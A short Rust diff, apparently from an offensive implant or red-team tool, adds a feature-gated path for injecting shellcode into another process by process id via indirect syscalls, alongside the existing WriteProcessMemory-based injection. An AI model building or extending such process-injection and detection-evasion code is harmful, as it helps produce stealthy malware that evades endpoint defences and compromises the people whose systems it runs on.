@@ -284,7 +284,12 @@ fn inject_cmd(args: &str) -> String {
     }
 }
 
-#[cfg(target_os = "windows")]
+#[cfg(all(target_os = "windows", feature = "indirect-syscalls"))]
+fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
+    crate::nt_inject::inject_shellcode_indirect(pid, shellcode)
+}
+
+#[cfg(all(target_os = "windows", not(feature = "indirect-syscalls")))]
 fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
     use winapi::um::memoryapi::WriteProcessMemory;
     use windows::{Win32::Foundation::*, Win32::System::Memory::*, Win32::System::Threading::*};
